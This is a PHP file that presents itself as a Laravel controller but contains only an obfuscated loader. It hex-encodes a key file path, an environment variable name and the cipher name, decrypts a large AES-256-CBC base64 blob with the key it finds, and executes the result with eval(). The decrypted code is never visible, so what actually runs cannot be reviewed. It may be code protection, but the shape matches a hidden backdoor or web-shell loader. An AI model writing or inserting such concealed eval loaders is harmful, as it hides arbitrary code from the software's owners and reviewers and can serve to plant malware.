<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2yI0OiY+CUeowm/SV+ZKwA==');

$c=base64_decode(

'qO18M2A9PMQ2fE6sSGGYNGjGCt0ZcVtIzDGd3rEG/9FHFBor+o3fcDCDGIrEFp3CAAWFZON/QeHZ' .
'Jlg5X3ygKzrf9snsAhnXGII6+ISp+yyT4BMWFT8fe7PSVa/DFd1vbr6Dyb+ze8XxIYmEQITB/xDe' .
'N3a2ZBeob7kMPjXOLTOCW41xz+zHFJLJLewlI68MX/PW7cyk9KKIrMXIc3qBEcZb92y8UfLA0apo' .
'pCov/uKpfXsTsqW34ICSHYdoSKt+i3QXAYL+RDt/BaElPMwHHUAtq98SFqRz9/x5hFQm/dJ5kTd7' .
'QGKXm8HxwqUq828Ic6MRYvn3KuaDiVlGOCx1U1pPNkDN6y9A5L9OKRwso3eD+AsLElrZKrIqGW7G' .
'3g9DlzETIyueJSdHUNBVMDT9TDU1LgmIn+AL+12px+ysOXlj3uMLLGFpxR/E+n6yvRBwP9HAmS1l' .
'49QFh9j5kURS6lYdRGkz106CfVykinzai0ctl7oww+DJttbqcrKms8VejGhZKega5bR/O9sQGWNk' .
'RS5/hmajppc9IrXypPrPnNl++EFOc+wC11Fiat3mVilC2kZ3kjApFHhp30zFsQUfJOGKUvngmKwT' .
'0LMw2JvoVebntPPNkTKWxKeooDNMdNAgZ9rz7mff11wRivVwQJHrgmmsacCAR39wIdHHs1fwhgTV' .
'ddX6QhsvSBkK/xHZ5ai0687cZtjJpcT/OYNWKCCSc0HhtjP1Fdh+XK5ZWUOzI6U6tPXhD6YKGEdk' .
'glUptF95/Ve+ffXylfUxVgT26Txh3y3gqDsTsRxlwpau0No/65D8fmBN26yuFXnDHOLE9CFoKx+/' .
'1/peS/rccTophgYuMW/GNDJ21Mel2SEn+b2BdyIMFsT5R1O7qklcHfIxdZRM7NIe0i1Xn3nMCLil' .
'tR6yi2eb/NElMARhRnx+/g8LHVMEWbrjK25W/JGnjy5BKzlC61qkCwYuRnatTpGFm4EdAzK7WMir' .
'TzhphZtEkEuK9syv8udvGc80zmvajtBsg8yAq2+lZQg25wLAWR3bclxws2zzoqU1hJYF9X/sgywp' .
'g8CO4uVRt9nAUqtqDpMW2FqjpHhJhJYcZKlvjAT7MNw25AFzowhgXIY1JmGqS3LX3Sc+lwMjyZ8s' .
'1RATP/A+l/ujeiff/luHgQPcBR6CNAPkMFJWls03bpl+oMx3PLxgQlq/yUy23aQ+aEU+1k1L7qXd' .
'Ujy+MnAqqHnWjZklQnSU3OC/4JqLz+svyj/M+cgCKi6QHBhhlEqZb2yUFr7qLj1GwpAWOvUK1cyE' .
'uhzGl5Vh2GNI9lNgT9VVNPKqI+EiMWnfUv8b2WTkx7sW6wnjGhCXeyfkwshARTaD9fb02W9Fbq0X' .
'Hp6nvSxvwV3AUok3mMSD8Gsu/7i/LUF/FU3e8DGiYO8SP+MKJXrdztYUf0juf/uKl8cceyd9nZZK' .
'JRP0unEpfgrzqE/8tYN1IVdsl4ruC/4wjxwTgISAzWY6af/q/hMDQgtWp+o00QPmqrfYzDa5htb6' .
'yLGY+P/2nVrDZfMVa503sE/JxOpBmnIOa7UERhs8HZo7b6gsT4E9gjRz72FxhbHbbxlT/+Nkl/oq' .
'hIAnUGSU+y7TvokcyoxvZ1vOCwRVlh/oq7VKgLQfj0SQqs22hxWC1tK/RV2SsZz391n33W+7LtX9' .
'MQOp1oyJxhQwHRm5COwTuEZ8erdswqvvSmxCx6mWyR8t1sFaWO9I9bKPYajuhLT+DU2syVFqJ6tm' .
'GO0GEZO503Svhq2d6K6WIR7M5UTv7tKVo+HHyQrYBdM1mseaaOZh8NFbcNPI6UAWNd/yy3RIsoci' .
'4PCYX43DVBuV3BwjI7POnDlejFeeKnIJC1VCVSsDQCkZv+7SIn8bvzM4MhmV/SmRJMMV9GEQIPXV' .
'Jp17wVNORLeJg/qkrsy50skBoei4p5nxNWeUtqxSLjYW5AvB1RGUuAnuHM2Eixq3eTcpMWWNT6K2' .
'+57J6k3hh/tlqypc33PH2tn3Dy+msP+C2YhQyQkyOcUs+9BoLnNueh/u9GMi3byD3mbb3w9I1FA/' .
'3uBwGlZrjbNWXMI+7Uya0XU8bMM84mocFSyEzZcavwLmXXfYz44v3hFDpePtwqVCd2NT5LvRllj8' .
'F7cNMuqVL2UmOsCl/38qtrU8mxZso5wfpcdsvnOstP9kgzaoYM7cUR5drkpX6/kRXX8k/ElUc7dc' .
'zWaHYDo6yyPlhuLBKHyvVOAEjVz9SGf1wlK5ObCvck5DXORwsMeXWTuUiT5CymBgXO31UrwUaqtW' .
'sqFSvy4LGCh6diDFf7bG6QyKOJ0aiclHhsa0mmoqENi36Q0MziG3vHgXdAYng3DXC6guUNHvOKKn' .
'uiSQJBo+KEta5ci6yR3Q5DAedGxHI+zjWyETcXXrRgM2a19+NkggwR1xlMVcz470X1+AMr9duRZW' .
'bL+o2zeRkKCbII6nfCfjjVveCRMuz7MRTUGhGGz7uQreeeV+e88zsso4tc1Zbhy9AK/142FweNxc' .
'H2up/0X5czyYrByKWgWhclhKbM4cWs0Y8KN2dBo80eG9/eJg6xhcvXFG/yq1rt/GfNnGvhEr/w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

